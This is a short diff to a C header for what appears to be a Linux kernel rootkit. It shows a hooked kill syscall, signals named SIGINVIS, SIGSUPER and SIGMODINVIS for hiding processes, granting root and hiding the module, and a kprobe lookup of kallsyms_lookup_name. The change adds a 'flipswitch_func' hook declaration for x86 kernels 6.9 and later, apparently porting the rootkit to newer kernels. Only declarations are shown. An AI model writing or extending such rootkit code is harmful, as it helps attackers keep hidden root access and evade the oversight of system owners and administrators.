@@ -25,6 +25,7 @@ hacked_kill(const struct pt_regs *pt_regs);
 asmlinkage long
 hacked_kill(pid_t pid, int sig);
 #endif
+
 struct linux_dirent {
         unsigned long   d_ino;
         unsigned long   d_off;
@@ -41,12 +42,18 @@ struct linux_dirent {
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
-	SIGMODINVIS = 63,
+	SIGMODINVIS = 63
 };
 
 #ifndef IS_ENABLED
 #define IS_ENABLED(option) \
 (defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
+#endif
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+#define DUMP_SIZE 0x5000
+void
+flipswitch_func(void *target_func, void *hacked_func);
 #endif
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
@@ -56,4 +63,3 @@ static struct kprobe kp = {
 	    .symbol_name = "kallsyms_lookup_name"
 };
 #endif
-
